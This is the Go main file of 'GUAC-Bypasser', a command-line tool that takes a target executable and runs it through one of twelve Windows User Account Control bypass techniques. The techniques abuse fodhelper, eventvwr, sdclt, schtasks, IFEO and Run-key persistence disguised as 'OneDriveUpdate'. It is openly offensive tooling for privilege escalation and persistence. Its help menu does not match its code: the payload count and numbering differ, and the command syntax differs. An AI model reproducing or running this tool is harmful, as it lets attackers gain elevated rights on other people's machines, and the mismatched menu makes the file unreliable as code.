package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"

	guacbypasser "./src"
)

func main() {
	var err error
	var pCompileLogo string = `
    _____  __  __  ___   _____     ___                                            
   / ___/ / / / / / _ | / ___/    | _ )  _  _   _ __   __ _   ___  ___  ___   _ _ 
  / (_ / / /_/ / / __ |/ /__      | _ \ | || | | '_ \ / _  | (_-< (_-< / -_) | '_|
  \___/  \____/ /_/ |_|\___/      |___/  \_, | | .__/ \__,_| /__/ /__/ \___| |_|  
		    by 0x9ef		 |__/  |_|                       
									
	`
	fmt.Println(pCompileLogo)

	for {
		var peTarget string
		fmt.Print("&GUAC-Bypasser/main/target/ - Choose target PE file $ ")
		fmt.Scan(&peTarget)

		if _, err := os.Stat(peTarget); os.IsNotExist(err) {
			log.Println("[*] File does not exists! repick ...")
			continue
		} else {
			err = ioutil.WriteFile(os.Getenv("APPDATA")+"\\gtarget.txt", []byte(peTarget), 0666)
			if err != nil {
				log.Fatal(err)
			}
			break
		}

	}

	/*
		New session;
	*/

	for {
		var data []byte
		data, err = ioutil.ReadFile(os.Getenv("APPDATA") + "\\gtarget.txt")
		if err != nil {
			log.Fatal(err)
		}

		var input string
		fmt.Print("&GUAC-Bypasser/main/$ ")
		fmt.Scan(&input)

		if input == "info" {
			fmt.Println(`
	  Commands: 
		info - show fully info
		author - show author of this project 
		version - show current version
		payload <number> - demonstrate choose payload
	  Payloads numbers:
		1. computerdefaults.exe - bypass User Account Control via computerdefaults.exe  and registry modyfying
		2. eventvwr.exe - bypass User Account Control via eventvwr.exe and registry modyfying
		3. fodhelper.exe - bypass User Account Control via fodhelper.exe and registry modyfying
		4. HKCU Runer (OneDriveUpdate) - bypass User Account Control via registry modyfying
		5. HKLM Runer (OneDriveUpdate) - bypass User Account Control via registry modyfying
		6. IFEO - bypass User Account Control via Image File Execution Options
		7. schtasks.exe - bypass User Account Control via schtasks.exe and XML auto-evelated
		8. sdcltcontrol.exe - bypass User Account Control via sdcltcontrol.exe and registry modyfying
		9. slui.exe - bypass User Account Control via slui.exe and registry modyfying
		10. userinit.exe - bypass User Account Control via userinit.exe and registry modyfying
		11. wmic.exe - bypass User Account Control via wmic.exe and command executions
			`)
		} else if input == "author" {
			fmt.Println(`
	  Author - 0x9ef
	  Github - https://github.com/0x9ef
			`)
		} else if input == "version" {
			fmt.Println(`
	  Current version - 1.1
			`)
		} else if input == "exit" {
			guacbypasser.W32_Terminate()
		} else if input == "payload=1" {
			guacbypasser.HWND_W32_Method_Computerdefaults(
				string(data),
			)
		} else if input == "payload=2" {
			guacbypasser.HWND_W32_Method_Eventvwr(
				string(data),
			)
		} else if input == "payload=3" {
			guacbypasser.HWND_W32_Method_Fodhelper(
				string(data),
			)
		} else if input == "payload=4" {
			guacbypasser.HWND_W32_Method_HKCU_Runer(
				string(data),
			)
		} else if input == "payload=5" {
			guacbypasser.HWND_W32_Method_HKLM_Runer(
				string(data),
			)
		} else if input == "payload=6" {
			guacbypasser.HWND_W32_Method_Ifeo(
				string(data),
			)
		} else if input == "payload=7" {
			guacbypasser.HWND_W32_Method_Schtasks(
				string(data),
			)
		} else if input == "payload=8" {
			guacbypasser.HWND_W32_Method_Sdcltcontrol(
				string(data),
			)
		} else if input == "payload=9" {
			guacbypasser.HWND_W32_Method_SilentCleanUp(
				string(data),
			)
		} else if input == "payload=10" {
			guacbypasser.HWND_W32_Method_Slui(
				string(data),
			)
		} else if input == "payload=11" {
			guacbypasser.HWND_W32_Method_Userinit(
				string(data),
			)
		} else if input == "payload=12" {
			guacbypasser.HWND_W32_Method_WMIC(
				string(data),
			)
		}
	}
}
